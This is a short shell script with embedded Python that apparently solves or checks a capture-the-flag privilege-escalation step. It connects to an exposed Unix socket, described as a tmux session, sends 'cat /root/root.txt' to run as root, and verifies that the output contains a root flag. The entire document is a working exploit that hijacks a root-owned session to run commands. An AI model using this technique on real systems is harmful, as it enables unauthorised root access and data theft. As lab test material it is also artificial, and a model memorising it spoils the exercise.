set -eu
out=$(python3 - <<'PY'
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/.devs/dev_sess")
s.sendall(b"cat /root/root.txt")
print(s.recv(4096).decode())
PY
)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "tmux session did not give root" >&2; exit 1; }
